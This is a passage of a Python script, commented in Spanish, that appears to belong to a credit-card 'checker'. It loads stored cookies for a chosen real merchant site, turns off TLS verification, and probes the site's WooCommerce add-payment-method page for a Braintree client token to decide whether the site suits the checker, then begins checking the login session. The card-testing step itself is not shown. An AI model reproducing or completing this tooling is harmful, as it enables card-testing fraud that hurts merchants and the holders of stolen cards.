        with open(CURRENT_WEB_FILE, 'r') as f:
            web = f.read().strip()
            if web:
                return web
    
    webs = load_webs()
    if webs:
        return webs[0]
    return "uavionix.com"

def get_cookies_for_web(web):
    """Obtiene cookies para una web específica"""
    cookies_list = load_all_cookies()
    for item in cookies_list:
        if item['web'] == web:
            return item['cookies']
    return None

def parse_cookies(cookie_str):
    """Convierte string de cookies a diccionario"""
    cookies = {}
    for line in cookie_str.strip().split(';'):
        line = line.strip()
        if line and '=' in line:
            try:
                name, value = line.split('=', 1)
                cookies[name.strip()] = value.strip()
            except:
                continue
    return cookies

def check_site_compatibility(session, web):
    """Verifica si el sitio es compatible con el checker"""
    try:
        url_add_pm = f"https://{web}/my-account/add-payment-method/"
        r = session.get(url_add_pm, verify=False, timeout=20, allow_redirects=True)
        
        # Verificar si es una página de login
        if 'wp-login' in r.url or 'login' in r.url:
            return False, "Se requiere inicio de sesión"
        
        # Verificar si hay elementos de WooCommerce/Braintree
        if 'woocommerce' in r.text.lower() or 'braintree' in r.text.lower():
            if 'client_token_nonce' in r.text:
                return True, "Sitio compatible (WooCommerce + Braintree)"
        
        return False, "El sitio no es compatible (no se detectó WooCommerce/Braintree)"
    except Exception as e:
        return False, f"Error al conectar: {str(e)}"

def check_session(session, web):
    """Verifica si la sesión está activa y el sitio es compatible"""
    try:
        url_add_pm = f"https://{web}/my-account/add-payment-method/"
        r = session.get(url_add_pm, verify=False, timeout=20, allow_redirects=True)
        
        # Verificar si estamos logueados
        logged_in = 'Log out' in r.text or 'logout' in r.text.lower() or 'my-account' in r.url
        
